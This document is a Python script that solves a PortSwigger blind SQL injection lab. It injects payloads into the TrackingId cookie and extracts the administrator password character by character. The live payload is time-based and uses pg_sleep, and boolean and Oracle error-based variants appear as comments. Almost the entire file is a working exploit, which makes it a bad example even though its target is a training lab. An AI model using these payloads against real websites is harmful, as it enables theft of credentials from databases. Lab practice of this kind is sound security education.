#!/usr/bin/python

# used to solve this lab https://portswigger.net/web-security/sql-injection/blind

import requests

url = 'https://ac321f131eb0a217800c1f9e00f100e2.web-security-academy.net/'
cookies = {
    "session": "INfjqmpX7HdnFKvn5nJksYgHiESPiYZW",
}
trackid = "J7fHlRX005Rq8O4L"

chars = [
    97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111,
    112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 48, 49, 50, 51, 52,
    53, 54, 55, 56, 57
]


def correct_range(text):
    return text.find("Welcome") != -1


def check_letter(letter_index):
    for i in range(0, len(chars)):
        print("check ", chr(chars[i]))
        #  cookies[
        #      "TrackingId"] = f"{trackid}' and substring((select password from users where username='administrator'),{letter_index},1) = '{chr(chars[i])}' --"

        #  cookies[
        #  "TrackingId"] = f"{trackid}' || (SELECT CASE WHEN (substr((select password from users where username='administrator'),{letter_index},1)='{chr(chars[i])}') THEN TO_CHAR(1/0) ELSE '' END FROM dual) -- "

        cookies[
            "TrackingId"] = f"{trackid}' || ( SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),{letter_index},1) ='{chr(chars[i])}') THEN pg_sleep(4) ELSE pg_sleep(0) END) -- "

        req = requests.get(url, cookies=cookies)
        print(req.elapsed.seconds)
        if req.elapsed.seconds > 3:
            print(chr(chars[i]))
            return chr(chars[i])


# from 65 to 122
password_len = 20
password = ""
for i in range(2, password_len + 1):
    letter = check_letter(i)
    #  print("letter ", letter)
    password += letter
    print(password)

print(password)
